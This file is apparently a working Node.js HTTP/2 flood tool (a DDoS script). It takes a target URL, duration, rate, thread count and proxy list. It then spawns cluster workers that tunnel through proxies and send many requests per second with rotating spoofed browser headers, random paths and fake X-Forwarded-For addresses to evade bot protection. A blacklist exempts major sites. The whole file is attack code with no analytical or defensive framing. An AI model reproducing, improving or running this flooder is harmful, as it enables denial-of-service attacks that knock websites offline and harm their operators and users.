const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
  console.log('node tls target time rate thread proxy'.rainbow);
  process.exit();
}

// ================= BLOCO IMPORTADO DO bypass.js =================
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 },
        duckduckgo: { min: 12, max: 16 }
    };

    const fullVersions = {
        brave: "90.0.4430.212",
        chrome: "90.0.4430.212",
        firefox: "88.0",
        safari: "14.1",
        mobile: "90.0.4430.212",
        opera: "90.0.4430.212",
        operagx: "90.0.4430.212",
        duckduckgo: "7.0"
    };

    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux",
        duckduckgo: "macOS"
    };
    const platform = platforms[browser];

    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(115 + Math.random() * 10)}.0.0.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        chrome: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Safari";v="${Math.floor(115 + Math.random() * 10)}", "AppleWebKit";v="${Math.floor(537 + Math.random() * 20)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "macOS" : "iOS",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X ${Math.random() < 0.5 ? "10_14_6" : "10_15_7"}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 10)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.apple.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        mobile: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(9 + Math.random() * 5)}.${Math.floor(Math.random() * 10)}; Mobile; rv:${Math.floor(60 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://m.example.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(70 + Math.random() * 10)}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64; rv:${Math.floor(70 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.mozilla.org/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        opera: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera";v="${Math.floor(75 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(75 + Math.random() * 10)}.0.0.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        operagx: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera GX";v="${Math.floor(80 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(80 + Math.random() * 10)}.0.0.0 GX`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/gx",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        duckduckgo: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": `Mozilla/5.0 (${Math.random() < 0.5 ? "Windows NT 10.0; Win64; x64" : "Linux; Android 11"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://duckduckgo.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        }
    };

    return headersMap[browser];
};

function shuffleHeaders(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffled = {};
    keys.forEach(key => shuffled[key] = obj[key]);
    return shuffled;
}

function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
// ================= FIM DO BLOCO IMPORTADO DO bypass.js =================

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};

const blackList = [
  "example.com",
  "google.com",
  "facebook.com",
  "youtube.com",
  "twitter.com",
  "instagram.com",
  "whatsapp.com",
  "tiktok.com",
  "linkedin.com",
  "reddit.com",
  "snapchat.com",
  "pinterest.com",
  "tumblr.com",
  "flickr.com",
  "vimeo.com",
  "twitch.tv",
  "discord.com",
  "telegram.org",
  "signal.org",
  "protonmail.com",
  "mailchimp.com",
  "dropbox.com",
  "onedrive.com",
  "icloud.com",
  "amazon.com",
  "ebay.com",
  "aliexpress.com",
  "mercadolivre.com",
  "shopee.com",
  "walmart.com",
  "target.com",
  "bestbuy.com",
  "gamestop.com",
  "steampowered.com",
  "epicgames.com",
  "gog.com",
  "origin.com",
  "ubisoft.com",
  "rockstargames.com",
  "blizzard.com",
  "activision.com",
  "bethesda.net",
  "playstation.com",
  "xbox.com",
  "nintendo.com",
  "sega.com",
  "ubisoft.com",
  "bandainamco.com",
  "square-enix.com",
  "capcom.com",
  "konami.com",
  "sega.com",
  "atari.com",
  "idsoftware.com",
  "valvesoftware.com",
  "bungie.com",
  "bioware.com",
  "obsidian.com",
  "larian.com",
  "cdprojektred.com",
  "techland.com",
  "4a-games.com",
  "bohemia.net",
  "frictionalgames.com",
  "telltale.com",
  "quanticdream.com",
  "naughydog.com",
  "insomniac.com",
  "suckerpunch.com",
  "guerrilla-games.com",
  "bendstudio.com",
  "media-molecule.com",
  "londonstudio.com",
  "sanmateo.com",
  "santamonica.com",
  "suckerpunch.com",
  "guerrilla-games.com",
  "bendstudio.com",
  "media-molecule.com",
  "londonstudio.com",
  "sanmateo.com",
  "santamonica.com"
];

if (blackList.includes(args.target)) { 
  console.log("Website Này Nằm Trong Danh Sách Black List."); 
  process.exit(1); 
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomElement(elements) {
  return elements[Math.floor(Math.random() * elements.length)];
}

class NetSocket {
  constructor() {}
  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);
    const connection = net.connect({ host: options.host, port: options.port });
    connection.setTimeout(options.timeout * 10 * 10000);
    connection.on("connect", () => connection.write(buffer));
    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      if (!response.includes("HTTP/1.1 200")) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });
    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });
  }
}

const Header = new NetSocket();

if (cluster.isMaster) {
  console.clear();
  console.log('TLS-HTTPS : @upgraded'.rainbow);
  console.log(`Target : ${parsedTarget.host}`.rainbow);
  console.log(`Time : ${args.time}/300 Second`.rainbow);
  console.log(`Threads : ${args.threads}/256`.rainbow);
  console.log(`Rate : ${args.Rate}/1024`.rainbow);
  console.log(`Proxy : ${args.proxyFile} | ${proxies.length}`.rainbow);
  console.log('Browser Simulation: Chrome/Firefox/Safari/Brave/Edge/Opera/Mobile/DuckDuckGo (rotating)'.rainbow);
  for (let i = 1; i <= args.threads; i++) cluster.fork();
  setTimeout(() => process.exit(1), args.time * 1000);
} else {
  setInterval(runFlooder, 0);
}

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 100
  };

  Header.HTTP(proxyOptions, (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 60000);

    const tlsOptions = {
      ALPNProtocols: ['h2', 'http/1.1'],
      ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
      rejectUnauthorized: false,
      socket: connection,
      honorCipherOrder: true,
      servername: parsedTarget.host,
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
      },
      createConnection: () => tlsConn,
      socket: connection
    });

    client.on("connect", () => {
      setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          // ===== USANDO OS HEADERS DINÂMICOS DO bypass.js =====
          const browser = getRandomBrowser();
          let headers = generateHeaders(browser);
          
          // Adiciona headers extras aleatórios como no bypass.js
          const randomString = randstr(10);
          const extraHeaders = {
            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
          };
          Object.assign(headers, extraHeaders);
          
          // Embaralha os headers para parecer mais natural
          const finalHeaders = shuffleHeaders(headers);
          // ===== FIM DOS HEADERS DINÂMICOS =====

          const request = client.request(finalHeaders);
          request.on("response", () => {
            request.close();
            request.destroy();
          });
          request.end();
        }
      }, 1000);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
    });
    client.on("error", () => {
      client.destroy();
      connection.destroy();
    });
  });
}

setTimeout(() => process.exit(1), args.time * 1000);